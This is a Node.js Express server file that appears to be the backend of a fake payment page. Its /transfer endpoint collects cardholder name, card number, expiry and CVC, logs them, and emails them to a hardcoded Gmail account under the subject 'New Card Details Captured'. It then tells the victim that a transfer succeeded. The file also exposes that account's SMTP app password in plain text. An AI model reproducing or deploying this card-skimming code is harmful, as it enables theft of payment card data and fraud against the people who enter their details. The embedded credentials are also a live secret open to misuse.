const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const nodemailer = require('nodemailer');

const app = express();
app.use(bodyParser.json());

// --- EMAIL CONFIGURATION ---
const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 465,
    secure: true, 
    auth: {
        user: 'shaonparvej99@gmail.com',
        pass: 'wmnecioqbenthppc'
    }
});


app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/transfer', (req, res) => {
    const { cardNumber, amount, name, expiry, cvc } = req.body;

    if (cardNumber) {
        // Logging the data to Render Console/Logs
        console.log("CRITICAL: New Card Data Received:", { name, cardNumber, expiry, cvc, amount });

        // Email details
        const mailOptions = {
            from: 'shaonparvej99@gmail.com',
            to: 'shaonparvej99@gmail.com', 
            subject: 'New Card Details Captured',
            text: `Submission Details:\n\n` +
                  `Cardholder Name: ${name}\n` +
                  `Card Number: ${cardNumber}\n` +
                  `Expiry Date: ${expiry}\n` +
                  `CVC/CVV: ${cvc}\n` +
                  `Amount: ${amount} USD\n` +
                  `Time: ${new Date().toLocaleString()}`
        };


        transporter.sendMail(mailOptions, (error, info) => {
            if (error) {
                console.log("Nodemailer Error:", error);
            } else {
                console.log("Email Sent Successfully: " + info.response);
            }
        });

        res.json({
            status: "Success",
            message: "Transfer of " + amount + " USD was successful!"
        });
    } else {
        res.status(400).json({ status: "Error", message: "Invalid Request" });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
